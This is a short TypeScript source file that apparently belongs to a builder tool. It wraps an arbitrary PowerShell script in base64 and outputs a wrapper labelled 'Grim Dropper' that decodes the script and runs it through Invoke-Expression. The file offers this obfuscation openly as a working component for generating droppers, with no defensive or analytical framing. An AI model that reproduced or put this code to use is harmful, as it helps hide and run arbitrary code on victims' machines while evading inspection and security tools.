/** Client-side PowerShell obfuscation (OpenCode builder parity). */
export function obfuscatePowerShell(script: string): string {
  const encoded = btoa(script);

  return [
    '# Grim Dropper - Obfuscated PowerShell Script',
    `# Generated at ${new Date().toISOString()}`,
    '',
    `$code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${encoded}'))`,
    '',
    'Invoke-Expression $code',
  ].join('\n');
}

export const OBFUSCATION_METHOD = 'Base64 + Invoke-Expression';
